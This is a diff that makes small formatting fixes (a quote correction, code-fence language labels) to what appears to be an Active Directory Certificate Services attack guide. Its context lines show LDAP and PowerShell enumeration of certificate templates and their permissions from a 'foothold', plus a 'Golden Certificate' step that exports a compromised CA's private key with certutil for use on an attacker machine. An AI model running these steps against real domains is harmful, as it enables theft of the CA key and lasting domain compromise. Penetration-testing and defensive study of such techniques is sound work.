@@ -185,7 +185,7 @@ ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
 
 ```bash
 # Templates with Client Authentication EKU (1.3.6.1.5.5.7.3.2)
-ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap' -w 'Password123!' \
+ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
   -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
   "(pKIExtendedKeyUsage=1.3.6.1.5.5.7.3.2)" \
   cn displayName pKIExtendedKeyUsage
@@ -207,7 +207,7 @@ ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 \
   templates 'VulnTemplate'
 ```
 
-```bash
+```powershell
 # Resolve SIDs and ACEs via PowerShell from a Windows foothold
 Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties Name, nTSecurityDescriptor |
   ForEach-Object { $_.nTSecurityDescriptor.Access | Where-Object {
@@ -1144,7 +1144,7 @@ A Golden Certificate is the PKI equivalent of a Golden Ticket. Once an attacker 
 
 ### Step 1 -- Recover the CA Private Key
 
-```bash
+```powershell
 # After compromising the CA server, backup the CA cert + key
 certutil -backupkey -p 'BackupPass!' C:\CA-Backup\
 # Copy the resulting .pfx to the attacker's machine
